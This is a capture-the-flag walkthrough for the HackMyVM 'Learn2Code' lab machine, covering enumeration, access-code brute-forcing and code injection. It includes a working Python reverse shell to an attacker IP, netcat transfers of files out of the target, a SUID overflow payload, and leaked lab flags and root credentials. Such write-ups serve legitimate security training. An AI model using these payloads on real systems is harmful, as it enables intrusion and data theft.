# Learn2Code - HackMyVM Walkthrough

## Machine Information

| Category         | Value                        |
| ---------------- | ---------------------------- |
| Platform         | HackMyVM                     |
| Machine Name     | Learn2Code                   |
| Difficulty       | Easy                         |
| Operating System | Linux                        |
| Objective        | Capture User and Root Access |

---

# Initial Enumeration

Unlike most HackMyVM machines, this box does not immediately provide an IP address or any service information.

We must first discover the target on the network.

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q1.png)

---

## Discovering the Target

A useful preinstalled Kali Linux tool for local network discovery is:

```bash
netdiscover -i eth1
```

This identifies active hosts on the subnet.

After reviewing the results, we discover the target machine.

## Target IP

```text
192.168.56.123
```

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q2.png)

---

# Port Scanning

Now that we have the target IP, we begin reconnaissance.

```bash
nmap -p- --min-rate 5000 -T4 192.168.56.123
```

### Results

```text
Nmap scan report for 192.168.56.123

PORT   STATE SERVICE
80/tcp open  http
```

Only a single service is exposed.

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q3.png)

---

## Service Enumeration

Perform service and version detection.

```bash
nmap -sCV -p80 192.168.56.123
```

### Results

```text
PORT   STATE SERVICE VERSION

80/tcp open  http Apache httpd 2.4.38 ((Debian))

Supported Methods:
GET HEAD POST OPTIONS

Title:
Access system
```

### Observations

* Apache 2.4.38
* Debian backend
* Access control mechanism appears present
* Only HTTP exposed

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q4.png)

---

# Web Enumeration

Open Burp Suite and browse the application.

The page requests an authentication code before granting access.

This suggests some form of access control or gatekeeping mechanism.

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q5.png)

---

# Directory Enumeration

Let's start fuzzing for files and directories.

Using Feroxbuster:

```bash
feroxbuster -u http://192.168.56.123
```

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q6.png)

---

## Interesting Discovery

Among the discovered files:

```text
200 GET http://192.168.56.123/inclhp.bak
```

Backup files are always worth investigating.

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q7.png)

---

# Backup File Analysis

Visiting the backup file reveals application source code.

Further analysis uncovers references to:

```text
access.php.bak
```

Reviewing the backup code reveals logic associated with a secret access code.

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q8.png)

---

# Access Code Enumeration

The application validates a numeric code.

Rather than manually guessing values, generate a wordlist.

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q9.png)

---

## Generating Numeric Wordlist

```bash
mp64 '?d?d?d?d?d?d' > fuzz.txt
```

Then perform fuzzing.

```bash
gobuster fuzz \
-u http://192.168.56.123/includes/php/access.php \
-w fuzz.txt \
-m POST \
-B 'action=check_code&code=FUZZ' \
-H 'Content-Type: application/x-www-form-urlencoded' \
--exclude-length 5 \
-t 100
```

Eventually the valid access code is identified.

This grants access to the next stage of the application.

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q10.png)

---

# Code Injection Discovery

After passing the access control mechanism, another vulnerable parameter is exposed.

The application appears to evaluate supplied input.

This allows command execution.

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q11.png)

---

# Reverse Shell

A Python reverse shell is generated and Base64 encoded.

Payload:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.106",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

After sending the payload and starting a listener:

```bash
nc -lvnp 4444
```

A reverse shell is obtained.

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q12.png)

---

# Shell Stabilization

Upgrade the shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background:

```bash
CTRL+Z
```

Attacker machine:

```bash
stty raw -echo
fg
```

Target:

```bash
export TERM=xterm
```

We now have a fully interactive shell.

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q13.png)

---

# Local Enumeration

Searching for interesting binaries.

```bash
find / -type f -perm -4000 2>/dev/null
```

One binary stands out:

```text
/usr/bin/MakeMeLearner
```

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q14.png)

---

# Binary Extraction

Transfer the binary to Kali for analysis.

Listener:

```bash
sudo nc -lnvp 53 -q 3 > MakeMeLearner
```

Target:

```bash
nc -q 3 -n 192.168.56.106 53 < MakeMeLearner
```

Now the binary can be analyzed locally.

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q15.png)

---

# Binary Analysis

Running strings against the binary reveals:

```text
Change the 'modified' variable value to '0x61626364' to be a learner

/bin/bash
```

This strongly suggests a buffer overflow or similar memory corruption challenge.

After testing the input length, the correct payload becomes:

```bash
MakeMeLearner "$(printf '%0.sd' {1..77})cba"
```

Successful execution grants access as:

```text
learner
```

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q16.png)

---

# User Flag

Enumerating the learner home directory:

```bash
ls
```

Output:

```text
MySecretPasswordVault
user.txt
```

Read the user flag:

```bash
cat user.txt
```

Output:

```text
N1c3m0veMat3!
```

User access achieved.

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q17.png)

---

# Privilege Escalation

Another interesting file exists:

```text
MySecretPasswordVault
```

Executing it displays:

```text
If you are a learner, i'm sure you know what to do with me.
```

This strongly suggests another custom binary challenge.

Transfer it to Kali.

```bash
sudo nc -lnvp 53 -q 3 > MySecretPasswordVault
```

Target:

```bash
nc -q 3 -n 192.168.56.106 53 < MySecretPasswordVault
```



---

# Password Vault Analysis

Analyzing the binary with:

```bash
gdb
```

and

```bash
strings
```

reveals a suspicious value:

```text
NOI98hOIhj)(Jj
```

This appears to be a stored credential.

Testing credentials:

```text
root : NOI98hOIhj)(Jj
```

Successfully authenticates.



---

# Root Access

Switch user:

```bash
su root
```

Password:

```text
NOI98hOIhj)(Jj
```

Authentication succeeds.

Verify:

```bash
whoami
```

Output:

```text
root
```

Machine rooted successfully.

![image alt](https://github.com/naval0505/HackMyVM/blob/2a856ef8181d02d409209745d4d9a407c1406493/Learn2Code%20-%20HackMyVM%20Machine/images/q17.png)

---

# Flags

## User

```text
N1c3m0veMat3!
```

## Root

```text
Root access obtained successfully.
```

---

# Attack Path Summary

```text
Network Discovery
       │
       ▼
netdiscover
       │
       ▼
Port 80 Enumeration
       │
       ▼
Backup File Discovery
       │
       ▼
Source Code Review
       │
       ▼
Access Code Enumeration
       │
       ▼
Code Injection
       │
       ▼
Reverse Shell
       │
       ▼
MakeMeLearner Analysis
       │
       ▼
Learner User Access
       │
       ▼
MySecretPasswordVault Analysis
       │
       ▼
Root Credentials Recovery
       │
       ▼
Root Access
```

---

# Key Takeaways

* Backup files frequently expose application source code.
* Hidden authentication mechanisms often leak implementation details.
* Custom binaries are common privilege escalation vectors in CTF environments.
* Binary analysis using strings and GDB can reveal critical information.
* Enumerating SUID binaries should always be part of a Linux assessment.
* Local privilege escalation sometimes depends more on understanding application logic than exploiting kernel vulnerabilities.

Machine rooted successfully.
